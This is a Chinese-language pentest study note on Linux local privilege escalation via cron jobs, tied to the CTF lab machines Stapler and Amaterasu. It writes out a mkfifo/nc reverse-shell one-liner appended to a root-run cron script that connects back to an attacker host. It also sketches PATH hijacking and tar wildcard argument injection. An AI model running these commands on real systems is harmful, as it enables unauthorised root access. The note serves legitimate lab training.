# Linux 定時任務權限劫持 (cron-job)
本文件說明如何利用可寫的定時任務指令碼進行本地特權提升。

## 💥 漏洞介紹
當系統中有些任務會以 root 權限定時（如每 5 分鐘）執行，但該任務所調用的外部腳本或二進位檔對普通使用者有寫入權限，即可進行代碼注入以劫持特權。

## 🛠️ 利用方法
1.  **檢查定時任務與權限**：
    檢查 `/etc/*cron*` 或是透過 `linpeas` 發現以 root 執行的可寫腳本：
    ```bash
    ls -la /usr/local/sbin/cron-logrotate.sh
    ```
2.  **注入惡意指令**：
    如果權限為可寫，直接將反彈 Shell 指令寫入該腳本的尾端：
    ```bash
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> <PORT> >/tmp/f" >> /usr/local/sbin/cron-logrotate.sh
    ```
3.  **接收 Shell**：
    本地端開啟 `nc -lvnp <PORT>` 監聽，等待定時任務被觸發。

## 💥 定時任務腳本中的設計漏洞利用 (以 Amaterasu 為例)
當以高權限（如 `root`）執行的定時任務腳本本身**不可寫入**，但其內部指令碼存在安全缺陷（例如：未妥善設置環境變數 `PATH`、使用相對路徑，或是使用萬用字元 `*` 等），仍可藉由這些設計缺陷進行特權提升。

### 1. 偵測與分析定時腳本
1.  **使用 `pspy` 工具監控後台進程**：
    將 `pspy64` 上傳至靶機並執行，監控是否有以高權限定期執行的後台任務：
    ```bash
    ./pspy64
    ```
    假設發現以 `root` (UID=0) 定時執行的任務 `/usr/local/bin/backup-flask.sh`：
    ```bash
    CMD: UID=0     PID=7307   | /bin/bash -c /usr/local/bin/backup-flask.sh
    ```
2.  **分析該腳本內容**：
    ```bash
    #!/bin/sh
    export PATH="/home/alfredo/restapi:$PATH"
    cd /home/alfredo/restapi
    tar czf /tmp/flask.tar.gz *
    ```
    *   **漏洞點 A**：腳本在最前端引入了使用者可寫的目錄 `/home/alfredo/restapi` 到環境變數 `PATH`，且 `tar` 使用相對路徑，容易受到 [[path-hijacking|PATH 劫持]] 攻擊。
    *   **漏洞點 B**：`tar` 命令使用 `*` 萬用字元，且備份目錄為使用者可寫入目錄，容易受到 [[tar-wildcard|Tar 萬用字元參數注入]] 攻擊。

### 2. 結合定時任務進行利用
*   **手法 A：利用 Tar 萬用字元參數注入**：
    在 `/home/alfredo/restapi` 底下建立 `--checkpoint=1` 等參數檔案，並建立執行提權的 `shell.sh`。當 cron-job 執行到 `tar *` 時，會將檔名解析為參數，以 `root` 身份執行 `shell.sh` 提權。詳細利用方式見  [[tar-wildcard#利用步驟|Tar 萬用字元參數注入]] 。
*   **手法 B：環境變數 PATH 劫持**：
    在該可寫目錄下編寫一個偽造的惡意 `tar` 腳本。由於 `PATH` 載入順序，定時任務在執行相對路徑的 `tar` 時會優先執行該惡意腳本。詳細利用方式見 [[path-hijacking#利用步驟|PATH 劫持]]。

---

# 實戰關聯
*   **靶機應用實例**：
    *   [[Stapler]] (利用可寫定時任務腳本注入惡意代碼提權)
    *   [[Amaterasu]] (利用定時任務腳本中的 PATH 優先權與 Tar 萬用字元漏洞提權)
